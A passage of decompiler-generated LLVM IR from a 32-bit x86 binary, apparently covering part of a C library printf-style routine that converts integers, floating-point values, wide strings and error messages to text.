  %v2_804eb5e = add i32 %v1_804eb5e, -4
  %v3_804eb5e = inttoptr i32 %v2_804eb5e to i32*
  store i32 %v0_804eb5e, i32* %v3_804eb5e, align 4
  %v0_804eb5f = load i32, i32* @esi, align 4
  %v2_804eb5f = add i32 %v1_804eb5e, -8
  %v3_804eb5f = inttoptr i32 %v2_804eb5f to i32*
  store i32 %v0_804eb5f, i32* %v3_804eb5f, align 4
  %v0_804eb60 = load i32, i32* @edx, align 4
  %v2_804eb60 = add i32 %v1_804eb5e, -12
  %v3_804eb60 = inttoptr i32 %v2_804eb60 to i32*
  store i32 %v0_804eb60, i32* %v3_804eb60, align 4
  %v2_804eb61 = add i32 %v1_804eb5e, -16
  %v3_804eb61 = inttoptr i32 %v2_804eb61 to i32*
  store i32 %v0_804eb59, i32* %v3_804eb61, align 4
  %v1_804eb62 = add i32 %v1_804eb5e, 339
  store i32 %v1_804eb62, i32* %eax.global-to-local, align 4
  %v2_804eb69 = add i32 %v1_804eb5e, -20
  %v3_804eb69 = inttoptr i32 %v2_804eb69 to i32*
  store i32 %v1_804eb62, i32* %v3_804eb69, align 4
  %v0_804eb6a = load i32, i32* %stack_var_-376, align 4
  %v5_804eb6a = inttoptr i32 %v0_804eb6a to i8*
  %v6_804eb6a = call i32 @_uintmaxtostr(i8* %v5_804eb6a, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804eb6a, i32* %eax.global-to-local, align 4
  store i32 %v6_804eb6a, i32* @ebx, align 4
  %v0_804eb71 = load i32, i32* @esp, align 4
  %v1_804eb71 = add i32 %v0_804eb71, 32
  %v1_804eb74 = add i32 %v0_804eb71, 76
  %v2_804eb74 = inttoptr i32 %v1_804eb74 to i32*
  %v3_804eb74 = load i32, i32* %v2_804eb74, align 4
  %tmp98 = icmp ult i32 %v3_804eb74, 6
  br i1 %tmp98, label %dec_label_pc_804eba2, label %dec_label_pc_804eb7b

dec_label_pc_804eb7b:                             ; preds = %dec_label_pc_804eb56
  %v1_804eb7b = inttoptr i32 %v6_804eb6a to i8*
  %v2_804eb7b = load i8, i8* %v1_804eb7b, align 1
  %v11_804eb7b = icmp eq i8 %v2_804eb7b, 45
  %v1_804eb7e = icmp eq i1 %v11_804eb7b, false
  %v1_804eb8d = add i32 %v0_804eb71, 60
  %v2_804eb8d = inttoptr i32 %v1_804eb8d to i32*
  %v3_804eb8d = load i32, i32* %v2_804eb8d, align 4
  br i1 %v1_804eb7e, label %dec_label_pc_804eb8d, label %dec_label_pc_804eb80

dec_label_pc_804eb80:                             ; preds = %dec_label_pc_804eb7b
  %v4_804eb80 = or i32 %v3_804eb8d, 2
  store i32 %v4_804eb80, i32* %v2_804eb8d, align 4
  %v0_804eb85 = load i32, i32* @ebx, align 4
  %v1_804eb85 = add i32 %v0_804eb85, 1
  store i32 %v1_804eb85, i32* @ebx, align 4
  store i32 2, i32* @edi, align 4
  %v0_804eba2.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804eba2

dec_label_pc_804eb8d:                             ; preds = %dec_label_pc_804eb7b
  store i32 %v3_804eb8d, i32* %eax.global-to-local, align 4
  %v2_804eb91 = and i32 %v3_804eb8d, 2
  %v3_804eb91 = icmp eq i32 %v2_804eb91, 0
  br i1 %v3_804eb91, label %dec_label_pc_804eb99, label %dec_label_pc_804eb95

dec_label_pc_804eb95:                             ; preds = %dec_label_pc_804eb8d
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804eba2

dec_label_pc_804eb99:                             ; preds = %dec_label_pc_804eb8d
  %v2_804eb99 = urem i32 %v3_804eb8d, 2
  %v3_804eb99 = icmp eq i32 %v2_804eb99, 0
  br i1 %v3_804eb99, label %dec_label_pc_804eba2, label %dec_label_pc_804eb9d

dec_label_pc_804eb9d:                             ; preds = %dec_label_pc_804eb99
  store i32 4, i32* @edi, align 4
  br label %dec_label_pc_804eba2

dec_label_pc_804eba2:                             ; preds = %dec_label_pc_804eb99, %dec_label_pc_804eb56, %dec_label_pc_804eb95, %dec_label_pc_804eb80, %dec_label_pc_804eb9d
  %v0_804ebef = phi i32 [ %v6_804eb6a, %dec_label_pc_804eb99 ], [ %v6_804eb6a, %dec_label_pc_804eb56 ], [ %v6_804eb6a, %dec_label_pc_804eb95 ], [ %v1_804eb85, %dec_label_pc_804eb80 ], [ %v6_804eb6a, %dec_label_pc_804eb9d ]
  %v0_804ebfe = phi i32 [ %v1_804eb71, %dec_label_pc_804eb99 ], [ %v1_804eb71, %dec_label_pc_804eb56 ], [ %v1_804eb71, %dec_label_pc_804eb95 ], [ %v0_804eba2.pre, %dec_label_pc_804eb80 ], [ %v1_804eb71, %dec_label_pc_804eb9d ]
  %v1_804eba2 = sub i32 327, %v0_804ebef
  %v2_804eba9 = add i32 %v1_804eba2, %v0_804ebfe
  store i32 %v2_804eba9, i32* @esi, align 4
  %v1_804ebab = add i32 %v0_804ebfe, 16
  %v2_804ebab = inttoptr i32 %v1_804ebab to i32*
  %v3_804ebab = load i32, i32* %v2_804ebab, align 4
  %v2_804ebaf = icmp slt i32 %v3_804ebab, 0
  %v1_804ebb1 = icmp eq i1 %v2_804ebaf, false
  br i1 %v1_804ebb1, label %dec_label_pc_804ebb8, label %dec_label_pc_804ebb3

dec_label_pc_804ebb3:                             ; preds = %dec_label_pc_804eba2
  br label %dec_label_pc_804ebb8

dec_label_pc_804ebb8:                             ; preds = %dec_label_pc_804eba2, %dec_label_pc_804ebb3
  %storemerge110 = phi i32 [ 1, %dec_label_pc_804ebb3 ], [ %v3_804ebab, %dec_label_pc_804eba2 ]
  %v0_804ebde = phi i32 [ 1, %dec_label_pc_804ebb3 ], [ %v3_804ebab, %dec_label_pc_804eba2 ]
  store i32 %storemerge110, i32* %edx.global-to-local, align 4
  %v1_804ebb8 = add i32 %v0_804ebfe, 28
  %v2_804ebb8 = inttoptr i32 %v1_804ebb8 to i8*
  %v3_804ebb8 = load i8, i8* %v2_804ebb8, align 1
  %v4_804ebb8 = and i8 %v3_804ebb8, 16
  %v5_804ebb8 = icmp eq i8 %v4_804ebb8, 0
  br i1 %v5_804ebb8, label %dec_label_pc_804ebef, label %dec_label_pc_804ebbf

dec_label_pc_804ebbf:                             ; preds = %dec_label_pc_804ebb8
  %v1_804ebbf = add i32 %v0_804ebfe, 44
  %v2_804ebbf = inttoptr i32 %v1_804ebbf to i32*
  %v3_804ebbf = load i32, i32* %v2_804ebbf, align 4
  store i32 %v3_804ebbf, i32* %eax.global-to-local, align 4
  %tmp99 = icmp ult i32 %v3_804ebbf, 3
  br i1 %tmp99, label %dec_label_pc_804ebd9.thread, label %dec_label_pc_804ebcd

dec_label_pc_804ebd9.thread:                      ; preds = %dec_label_pc_804ebbf
  store i32 6, i32* @edi, align 4
  br label %dec_label_pc_804ebef

dec_label_pc_804ebcd:                             ; preds = %dec_label_pc_804ebbf
  %v9_804ebcd = icmp eq i32 %v3_804ebbf, 3
  %v1_804ebd0 = icmp eq i1 %v9_804ebcd, false
  br i1 %v1_804ebd0, label %dec_label_pc_804ebd9, label %dec_label_pc_804ebd2

dec_label_pc_804ebd2:                             ; preds = %dec_label_pc_804ebcd
  store i32 9, i32* @edi, align 4
  br label %dec_label_pc_804ebef

dec_label_pc_804ebd9:                             ; preds = %dec_label_pc_804ebcd
  %v9_804ebd9 = icmp eq i32 %v3_804ebbf, 4
  %v1_804ebdc = icmp eq i1 %v9_804ebd9, false
  br i1 %v1_804ebdc, label %dec_label_pc_804ebef, label %dec_label_pc_804ebde

dec_label_pc_804ebde:                             ; preds = %dec_label_pc_804ebd9
  %tmp100 = icmp ugt i32 %v0_804ebde, %v2_804eba9
  br i1 %tmp100, label %dec_label_pc_804ebef, label %dec_label_pc_804ebe2

dec_label_pc_804ebe2:                             ; preds = %dec_label_pc_804ebde
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804ebe7 = inttoptr i32 %v0_804ebef to i8*
  %v2_804ebe7 = load i8, i8* %v1_804ebe7, align 1
  %v8_804ebe7 = icmp eq i8 %v2_804ebe7, 48
  br i1 %v8_804ebe7, label %dec_label_pc_804ebef, label %dec_label_pc_804ebec

dec_label_pc_804ebec:                             ; preds = %dec_label_pc_804ebe2
  %v1_804ebec = add i32 %v2_804eba9, 1
  store i32 %v1_804ebec, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ebef

dec_label_pc_804ebef:                             ; preds = %dec_label_pc_804ebd9.thread, %dec_label_pc_804ebde, %dec_label_pc_804ebe2, %dec_label_pc_804ebd9, %dec_label_pc_804ebb8, %dec_label_pc_804ebd2, %dec_label_pc_804ebec
  %v0_804ec24 = phi i32 [ %v0_804ebde, %dec_label_pc_804ebde ], [ 1, %dec_label_pc_804ebe2 ], [ %v0_804ebde, %dec_label_pc_804ebd9 ], [ %v0_804ebde, %dec_label_pc_804ebb8 ], [ %v0_804ebde, %dec_label_pc_804ebd2 ], [ %v1_804ebec, %dec_label_pc_804ebec ], [ %v0_804ebde, %dec_label_pc_804ebd9.thread ]
  %v1_804ebef = inttoptr i32 %v0_804ebef to i8*
  %v2_804ebef = load i8, i8* %v1_804ebef, align 1
  %v8_804ebef = icmp eq i8 %v2_804ebef, 48
  %v1_804ebf2 = icmp eq i1 %v8_804ebef, false
  br i1 %v1_804ebf2, label %dec_label_pc_804ec19, label %dec_label_pc_804ebf4

dec_label_pc_804ebf4:                             ; preds = %dec_label_pc_804ebef
  %v0_804ebf4 = load i32, i32* @edi, align 4
  %v7_804ebf7 = icmp sgt i32 %v0_804ebf4, 5
  br i1 %v7_804ebf7, label %dec_label_pc_804ebf9, label %dec_label_pc_804ebfe

dec_label_pc_804ebf9:                             ; preds = %dec_label_pc_804ebf4
  store i32 11, i32* @edi, align 4
  br label %dec_label_pc_804ebfe

dec_label_pc_804ebfe:                             ; preds = %dec_label_pc_804ebf4, %dec_label_pc_804ebf9
  %v1_804ebfe = add i32 %v0_804ebfe, 44
  %v2_804ebfe = inttoptr i32 %v1_804ebfe to i32*
  %v3_804ebfe = load i32, i32* %v2_804ebfe, align 4
  %v12_804ebfe = icmp eq i32 %v3_804ebfe, 1
  %v1_804ec03 = icmp eq i1 %v12_804ebfe, false
  br i1 %v1_804ec03, label %dec_label_pc_804ec11, label %dec_label_pc_804ec05

dec_label_pc_804ec05:                             ; preds = %dec_label_pc_804ebfe
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_8051314.122 to i32), i32* @ebx, align 4
  br label %dec_label_pc_804ec1d

dec_label_pc_804ec11:                             ; preds = %dec_label_pc_804ebfe
  %v1_804ec11 = icmp eq i32 %v0_804ec24, 0
  %v1_804ec13 = icmp eq i1 %v1_804ec11, false
  br i1 %v1_804ec13, label %dec_label_pc_804ec19, label %dec_label_pc_804ec15

dec_label_pc_804ec15:                             ; preds = %dec_label_pc_804ec11
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804ec1d

dec_label_pc_804ec19:                             ; preds = %dec_label_pc_804ec11, %dec_label_pc_804ebef
  %v2_804ec19 = sub i32 %v0_804ec24, %v2_804eba9
  %v7_804ec19 = icmp ult i32 %v0_804ec24, %v2_804eba9
  %v12_804ec19 = icmp eq i32 %v2_804ec19, 0
  %v2_804ec1b = or i1 %v7_804ec19, %v12_804ec19
  br i1 %v2_804ec1b, label %dec_label_pc_804ec1d, label %dec_label_pc_804ec24

dec_label_pc_804ec1d:                             ; preds = %dec_label_pc_804ec19, %dec_label_pc_804ec15, %dec_label_pc_804ec05
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804ee23

dec_label_pc_804ec24:                             ; preds = %dec_label_pc_804ec19
  store i32 %v2_804ec19, i32* @ebp, align 4
  br label %dec_label_pc_804ee23

dec_label_pc_804ec2d:                             ; preds = %dec_label_pc_804eace
  %tmp101 = icmp ult i32 %v3_804eaa0, 16
  br i1 %tmp101, label %dec_label_pc_804ec32, label %dec_label_pc_804ec6a

dec_label_pc_804ec32:                             ; preds = %dec_label_pc_804ec2d
  %v1_804ec32 = add i32 %v0_804eb29.lcssa, 29
  %v2_804ec32 = inttoptr i32 %v1_804ec32 to i8*
  %v3_804ec32 = load i8, i8* %v2_804ec32, align 1
  %v4_804ec32 = and i8 %v3_804ec32, 8
  %v5_804ec32 = icmp eq i8 %v4_804ec32, 0
  %v1_804ec37 = add i32 %v0_804eb29.lcssa, 328
  %v2_804ec37 = inttoptr i32 %v1_804ec37 to i32*
  %v3_804ec37 = load i32, i32* %v2_804ec37, align 4
  store i32 %v3_804ec37, i32* %eax.global-to-local, align 4
  br i1 %v5_804ec32, label %dec_label_pc_804ec44, label %dec_label_pc_804ec40

dec_label_pc_804ec40:                             ; preds = %dec_label_pc_804ec32
  %v1_804ec40 = inttoptr i32 %v3_804ec37 to x86_fp80*
  %v2_804ec40 = load x86_fp80, x86_fp80* %v1_804ec40, align 4
  br label %dec_label_pc_804ec46

dec_label_pc_804ec44:                             ; preds = %dec_label_pc_804ec32
  %v1_804ec44 = inttoptr i32 %v3_804ec37 to double*
  %v2_804ec44 = load double, double* %v1_804ec44, align 4
  %v3_804ec44 = fpext double %v2_804ec44 to x86_fp80
  br label %dec_label_pc_804ec46

dec_label_pc_804ec46:                             ; preds = %dec_label_pc_804ec40, %dec_label_pc_804ec44
  %storemerge7 = phi x86_fp80 [ %v2_804ec40, %dec_label_pc_804ec40 ], [ %v3_804ec44, %dec_label_pc_804ec44 ]
  store x86_fp80 %storemerge7, x86_fp80* %st0.global-to-local, align 4
  %v1_804ec46 = add i32 %v0_804eb29.lcssa, -4
  %v2_804ec46 = inttoptr i32 %v1_804ec46 to i32*
  store i32 134539569, i32* %v2_804ec46, align 4
  %v1_804ec4b = add i32 %v0_804eb29.lcssa, 16
  store i32 %v1_804ec4b, i32* %eax.global-to-local, align 4
  %v2_804ec4f = add i32 %v0_804eb29.lcssa, -8
  %v3_804ec4f = inttoptr i32 %v2_804ec4f to i32*
  store i32 %v1_804ec4b, i32* %v3_804ec4f, align 4
  %v1_804ec50 = add i32 %v0_804eb29.lcssa, -20
  %v1_804ec53 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_804ec53 = inttoptr i32 %v1_804ec50 to x86_fp80*
  store x86_fp80 %v1_804ec53, x86_fp80* %v3_804ec53, align 4
  %v1_804ec56 = add i32 %v0_804eb29.lcssa, 380
  %v2_804ec56 = inttoptr i32 %v1_804ec56 to i32*
  %v3_804ec56 = load i32, i32* %v2_804ec56, align 4
  %v5_804ec56 = add i32 %v0_804eb29.lcssa, -24
  %v6_804ec56 = inttoptr i32 %v5_804ec56 to i32*
  store i32 %v3_804ec56, i32* %v6_804ec56, align 4
  %v0_804ec5d = call i32 @_fpmaxtostr()
  store i32 %v0_804ec5d, i32* %eax.global-to-local, align 4
  %v0_804ec62 = load i32, i32* @esp, align 4
  %v1_804ec62 = add i32 %v0_804ec62, 24
  br label %dec_label_pc_804edfa

dec_label_pc_804ec6a:                             ; preds = %dec_label_pc_804ec2d
  %tmp102 = or i32 %v3_804eaa0, 1
  %tmp103 = icmp eq i32 %tmp102, 17
  br i1 %tmp103, label %dec_label_pc_804ec73, label %dec_label_pc_804ed03

dec_label_pc_804ec73:                             ; preds = %dec_label_pc_804ec6a
  %v1_804ec73 = add i32 %v0_804eb29.lcssa, 348
  %v2_804ec73 = inttoptr i32 %v1_804ec73 to i32*
  store i32 0, i32* %v2_804ec73, align 4
  %v0_804ec7e = load i32, i32* @esp, align 4
  %v1_804ec7e = add i32 %v0_804ec7e, 44
  %v2_804ec7e = inttoptr i32 %v1_804ec7e to i32*
  %v3_804ec7e = load i32, i32* %v2_804ec7e, align 4
  %v12_804ec7e = icmp eq i32 %v3_804ec7e, 17
  %v1_804ec83 = add i32 %v0_804ec7e, 328
  %v2_804ec83 = inttoptr i32 %v1_804ec83 to i32*
  %v3_804ec83 = load i32, i32* %v2_804ec83, align 4
  store i32 %v3_804ec83, i32* %eax.global-to-local, align 4
  %v1_804ec8a = icmp eq i1 %v12_804ec7e, false
  br i1 %v1_804ec8a, label %dec_label_pc_804ecd4, label %dec_label_pc_804ec8c

dec_label_pc_804ec8c:                             ; preds = %dec_label_pc_804ec73
  %v1_804ec8c = inttoptr i32 %v3_804ec83 to i32*
  %v2_804ec8c = load i32, i32* %v1_804ec8c, align 4
  store i32 %v2_804ec8c, i32* %eax.global-to-local, align 4
  %v2_804ec8e = add i32 %v0_804ec7e, 356
  %v3_804ec8e = inttoptr i32 %v2_804ec8e to i32*
  store i32 %v2_804ec8c, i32* %v3_804ec8e, align 4
  %v1_804ec95 = icmp eq i32 %v2_804ec8c, 0
  %v0_804ed44.pre = load i32, i32* @esp, align 4
  br i1 %v1_804ec95, label %dec_label_pc_804ed44, label %dec_label_pc_804ec9d

dec_label_pc_804ec9d:                             ; preds = %dec_label_pc_804ec8c
  %v1_804ec9d = add i32 %v0_804ed44.pre, 16
  %v2_804ec9d = inttoptr i32 %v1_804ec9d to i32*
  %v3_804ec9d = load i32, i32* %v2_804ec9d, align 4
  store i32 %v3_804ec9d, i32* %eax.global-to-local, align 4
  %v2_804eca4 = icmp slt i32 %v3_804ec9d, 0
  br i1 %v2_804eca4, label %dec_label_pc_804ecaa, label %dec_label_pc_804eca8

dec_label_pc_804eca8:                             ; preds = %dec_label_pc_804ec9d
  br label %dec_label_pc_804ecaa

dec_label_pc_804ecaa:                             ; preds = %dec_label_pc_804ec9d, %dec_label_pc_804eca8
  %storemerge108 = phi i32 [ %v3_804ec9d, %dec_label_pc_804eca8 ], [ -1, %dec_label_pc_804ec9d ]
  store i32 %storemerge108, i32* %edx.global-to-local, align 4
  %v1_804ecaa = add i32 %v0_804ed44.pre, 356
  store i32 %v1_804ecaa, i32* %eax.global-to-local, align 4
  %v1_804ecb1 = add i32 %v0_804ed44.pre, 348
  %v2_804ecb8 = add i32 %v0_804ed44.pre, -4
  %v3_804ecb8 = inttoptr i32 %v2_804ecb8 to i32*
  store i32 %v1_804ecb1, i32* %v3_804ecb8, align 4
  %v0_804ecb9 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ecb9 = add i32 %v0_804ed44.pre, -8
  %v3_804ecb9 = inttoptr i32 %v2_804ecb9 to i32*
  store i32 %v0_804ecb9, i32* %v3_804ecb9, align 4
  %v0_804ecba = load i32, i32* %eax.global-to-local, align 4
  %v2_804ecba = add i32 %v0_804ed44.pre, -12
  %v3_804ecba = inttoptr i32 %v2_804ecba to i32*
  store i32 %v0_804ecba, i32* %v3_804ecba, align 4
  %v0_804ecbb = load i32, i32* %eax.global-to-local, align 4
  %v2_804ecbb = add i32 %v0_804ed44.pre, -16
  %v3_804ecbb = inttoptr i32 %v2_804ecbb to i32*
  store i32 %v0_804ecbb, i32* %v3_804ecbb, align 4
  %v0_804ecbc = call i32 @__GI_wcsrtombs()
  store i32 %v0_804ecbc, i32* %eax.global-to-local, align 4
  store i32 %v0_804ecbc, i32* @esi, align 4
  %v0_804ecc3 = load i32, i32* @esp, align 4
  %v1_804ecc3 = add i32 %v0_804ecc3, 16
  %v10_804ecc6 = icmp eq i32 %v0_804ecbc, -1
  %v1_804ecc9 = icmp eq i1 %v10_804ecc6, false
  br i1 %v1_804ecc9, label %dec_label_pc_804ee15, label %dec_label_pc_804ef83

dec_label_pc_804ecd4:                             ; preds = %dec_label_pc_804ec73
  %v1_804ecd4 = add i32 %v0_804ec7e, 348
  store i32 %v1_804ecd4, i32* %edx.global-to-local, align 4
  %v2_804ecdb = add i32 %v0_804ec7e, -4
  %v3_804ecdb = inttoptr i32 %v2_804ecdb to i32*
  store i32 %v1_804ecd4, i32* %v3_804ecdb, align 4
  %v0_804ecdc = load i32, i32* %eax.global-to-local, align 4
  %v1_804ecdc = inttoptr i32 %v0_804ecdc to i32*
  %v2_804ecdc = load i32, i32* %v1_804ecdc, align 4
  %v4_804ecdc = add i32 %v0_804ec7e, -8
  %v5_804ecdc = inttoptr i32 %v4_804ecdc to i32*
  store i32 %v2_804ecdc, i32* %v5_804ecdc, align 4
  %v1_804ecde = add i32 %v0_804ec7e, 200
  store i32 %v1_804ecde, i32* @ebx, align 4
  %v2_804ece5 = add i32 %v0_804ec7e, -12
  %v3_804ece5 = inttoptr i32 %v2_804ece5 to i32*
  store i32 %v1_804ecde, i32* %v3_804ece5, align 4
  %v0_804ece6 = call i32 @__GI_wcrtomb()
  store i32 %v0_804ece6, i32* %eax.global-to-local, align 4
  store i32 %v0_804ece6, i32* @esi, align 4
  %v0_804eced = load i32, i32* @esp, align 4
  %v1_804eced = add i32 %v0_804eced, 12
  %v10_804ecf0 = icmp eq i32 %v0_804ece6, -1
  br i1 %v10_804ecf0, label %dec_label_pc_804ef83, label %dec_label_pc_804ecf9

dec_label_pc_804ecf9:                             ; preds = %dec_label_pc_804ecd4
  %v2_804ecf9 = add i32 %v0_804ece6, 212
  %v3_804ecf9 = add i32 %v2_804ecf9, %v0_804eced
  %v4_804ecf9 = inttoptr i32 %v3_804ecf9 to i8*
  store i8 0, i8* %v4_804ecf9, align 1
  %v0_804ed3a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ed33

dec_label_pc_804ed03:                             ; preds = %dec_label_pc_804ec6a
  %tmp104 = icmp ult i32 %v3_804eaa0, 20
  br i1 %tmp104, label %dec_label_pc_804ed0c, label %dec_label_pc_804ed9e

dec_label_pc_804ed0c:                             ; preds = %dec_label_pc_804ed03
  %v9_804ed03 = icmp eq i32 %v3_804eaa0, 19
  %v1_804ed0c = add i32 %v0_804eb29.lcssa, 328
  %v2_804ed0c = inttoptr i32 %v1_804ed0c to i32*
  %v3_804ed0c = load i32, i32* %v2_804ed0c, align 4
  store i32 %v3_804ed0c, i32* %eax.global-to-local, align 4
  %v1_804ed13 = icmp eq i1 %v9_804ed03, false
  %v1_804ed70 = inttoptr i32 %v3_804ed0c to i32*
  %v2_804ed70 = load i32, i32* %v1_804ed70, align 4
  br i1 %v1_804ed13, label %dec_label_pc_804ed70, label %dec_label_pc_804ed15

dec_label_pc_804ed15:                             ; preds = %dec_label_pc_804ed0c
  store i32 %v2_804ed70, i32* @ebx, align 4
  %v1_804ed17 = icmp eq i32 %v2_804ed70, 0
  br i1 %v1_804ed17, label %dec_label_pc_804ed44, label %dec_label_pc_804ed1b

dec_label_pc_804ed1b:                             ; preds = %dec_label_pc_804ed15, %dec_label_pc_804eda3
  %v1_804ed28 = phi i32 [ %v0_804eb29.lcssa, %dec_label_pc_804ed15 ], [ %v1_804edbe, %dec_label_pc_804eda3 ]
  %v1_804ed1b = add i32 %v1_804ed28, 16
  %v2_804ed1b = inttoptr i32 %v1_804ed1b to i32*
  %v3_804ed1b = load i32, i32* %v2_804ed1b, align 4
  store i32 %v3_804ed1b, i32* %eax.global-to-local, align 4
  %v2_804ed22 = icmp slt i32 %v3_804ed1b, 0
  br i1 %v2_804ed22, label %dec_label_pc_804ed28, label %dec_label_pc_804ed26

dec_label_pc_804ed26:                             ; preds = %dec_label_pc_804ed1b
  br label %dec_label_pc_804ed28

dec_label_pc_804ed28:                             ; preds = %dec_label_pc_804ed1b, %dec_label_pc_804ed26
  %storemerge = phi i32 [ %v3_804ed1b, %dec_label_pc_804ed26 ], [ -1, %dec_label_pc_804ed1b ]
  %v0_804ed28 = phi i32 [ %v3_804ed1b, %dec_label_pc_804ed26 ], [ -1, %dec_label_pc_804ed1b ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v2_804ed28 = add i32 %v1_804ed28, -4
  %v3_804ed28 = inttoptr i32 %v2_804ed28 to i32*
  store i32 %v0_804ed28, i32* %v3_804ed28, align 4
  %v0_804ed29 = load i32, i32* @ebx, align 4
  %v2_804ed29 = add i32 %v1_804ed28, -8
  %v3_804ed29 = inttoptr i32 %v2_804ed29 to i32*
  store i32 %v0_804ed29, i32* %v3_804ed29, align 4
  %v0_804ed2a = call i32 @strnlen()
  store i32 %v0_804ed2a, i32* %eax.global-to-local, align 4
  %v0_804ed2f = load i32, i32* @esp, align 4
  %v3_804ed30 = add i32 %v0_804ed2f, 8
  store i32 %v0_804ed2a, i32* @esi, align 4
  br label %dec_label_pc_804ed33

dec_label_pc_804ed33:                             ; preds = %dec_label_pc_804ecf9, %dec_label_pc_804ed28
  %v0_804ed3a = phi i32 [ %v0_804ed3a.pre, %dec_label_pc_804ecf9 ], [ %v3_804ed30, %dec_label_pc_804ed28 ]
  store i32 0, i32* @ebp, align 4
  store i32 11, i32* @edi, align 4
  %v1_804ed3a = add i32 %v0_804ed3a, 7
  %v2_804ed3a = inttoptr i32 %v1_804ed3a to i8*
  store i8 32, i8* %v2_804ed3a, align 1
  br label %dec_label_pc_804ee23

dec_label_pc_804ed44:                             ; preds = %dec_label_pc_804ec8c, %dec_label_pc_804ed15
  %v0_804ed61 = phi i32 [ %v0_804eb29.lcssa, %dec_label_pc_804ed15 ], [ %v0_804ed44.pre, %dec_label_pc_804ec8c ]
  %v1_804ed44 = add i32 %v0_804ed61, 16
  %v2_804ed44 = inttoptr i32 %v1_804ed44 to i32*
  %v3_804ed44 = load i32, i32* %v2_804ed44, align 4
  store i32 %v3_804ed44, i32* %eax.global-to-local, align 4
  %v2_804ed48 = icmp slt i32 %v3_804ed44, 0
  br i1 %v2_804ed48, label %dec_label_pc_804ed5a, label %dec_label_pc_804ed4c

dec_label_pc_804ed4c:                             ; preds = %dec_label_pc_804ed44
  %tmp105 = icmp ult i32 %v3_804ed44, 6
  %. = select i1 %tmp105, i32 0, i32 6
  br label %dec_label_pc_804ed5a

dec_label_pc_804ed5a:                             ; preds = %dec_label_pc_804ed4c, %dec_label_pc_804ed44
  %storemerge8 = phi i32 [ 6, %dec_label_pc_804ed44 ], [ %., %dec_label_pc_804ed4c ]
  store i32 %storemerge8, i32* @esi, align 4
  store i32 0, i32* @ebp, align 4
  store i32 11, i32* @edi, align 4
  %v1_804ed61 = add i32 %v0_804ed61, 7
  %v2_804ed61 = inttoptr i32 %v1_804ed61 to i8*
  store i8 32, i8* %v2_804ed61, align 1
  store i32 ptrtoint ([7 x i8]* @global_var_805131a.123 to i32), i32* @ebx, align 4
  br label %dec_label_pc_804ee23

dec_label_pc_804ed70:                             ; preds = %dec_label_pc_804ed0c
  store i32 %v2_804ed70, i32* %eax.global-to-local, align 4
  %v1_804ed72 = trunc i32 %v2_804ed70 to i8
  %v3_804ed72 = add i32 %v0_804eb29.lcssa, 200
  %v4_804ed72 = inttoptr i32 %v3_804ed72 to i8*
  store i8 %v1_804ed72, i8* %v4_804ed72, align 1
  %v0_804ed79 = load i32, i32* @esp, align 4
  %v1_804ed79 = add i32 %v0_804ed79, 201
  %v2_804ed79 = inttoptr i32 %v1_804ed79 to i8*
  store i8 0, i8* %v2_804ed79, align 1
  store i32 1, i32* @esi, align 4
  store i32 0, i32* @ebp, align 4
  store i32 11, i32* @edi, align 4
  %v0_804ed8d = load i32, i32* @esp, align 4
  %v1_804ed8d = add i32 %v0_804ed8d, 7
  %v2_804ed8d = inttoptr i32 %v1_804ed8d to i8*
  store i8 32, i8* %v2_804ed8d, align 1
  %v0_804ed92 = load i32, i32* @esp, align 4
  %v1_804ed92 = add i32 %v0_804ed92, 200
  store i32 %v1_804ed92, i32* @ebx, align 4
  br label %dec_label_pc_804ee23

dec_label_pc_804ed9e:                             ; preds = %dec_label_pc_804ed03
  %v9_804ed9e = icmp eq i32 %v3_804eaa0, 20
  %v1_804eda1 = icmp eq i1 %v9_804ed9e, false
  br i1 %v1_804eda1, label %dec_label_pc_804edc6, label %dec_label_pc_804eda3

dec_label_pc_804eda3:                             ; preds = %dec_label_pc_804ed9e
  %v0_804eda3 = load i32, i32* %stack_var_-376, align 4
  %v1_804eda3 = call i32 @__GI___errno_location(i32 %v0_804eda3)
  store i32 %v1_804eda3, i32* %eax.global-to-local, align 4
  %v0_804eda8 = load i32, i32* @esp, align 4
  %v1_804eda8 = add i32 %v0_804eda8, -4
  %v2_804eda8 = inttoptr i32 %v1_804eda8 to i32*
  store i32 128, i32* %v2_804eda8, align 4
  %v1_804edad = add i32 %v0_804eda8, 200
  store i32 %v1_804edad, i32* %edx.global-to-local, align 4
  %v2_804edb4 = add i32 %v0_804eda8, -8
  %v3_804edb4 = inttoptr i32 %v2_804edb4 to i32*
  store i32 %v1_804edad, i32* %v3_804edb4, align 4
  %v1_804edb5 = inttoptr i32 %v1_804eda3 to i32*
  %v2_804edb5 = load i32, i32* %v1_804edb5, align 4
  %v4_804edb5 = add i32 %v0_804eda8, -12
  %v5_804edb5 = inttoptr i32 %v4_804edb5 to i32*
  store i32 %v2_804edb5, i32* %v5_804edb5, align 4
  %v0_804edb7 = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_804edb7, i32* %eax.global-to-local, align 4
  store i32 %v0_804edb7, i32* @ebx, align 4
  %v0_804edbe = load i32, i32* @esp, align 4
  %v1_804edbe = add i32 %v0_804edbe, 12
  br label %dec_label_pc_804ed1b

dec_label_pc_804edc6:                             ; preds = %dec_label_pc_804ed9e
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_804eddc = add i32 %v0_804eb29.lcssa, 328
  %v2_804ede3 = add i32 %v0_804eb29.lcssa, -4
  %v3_804ede3 = inttoptr i32 %v2_804ede3 to i32*
  store i32 %v1_804eddc, i32* %v3_804ede3, align 4
  %v1_804ede4 = add i32 %v0_804eb29.lcssa, 16
  store i32 %v1_804ede4, i32* %eax.global-to-local, align 4
  %v2_804ede8 = add i32 %v0_804eb29.lcssa, -8
  %v3_804ede8 = inttoptr i32 %v2_804ede8 to i32*
  store i32 %v1_804ede4, i32* %v3_804ede8, align 4
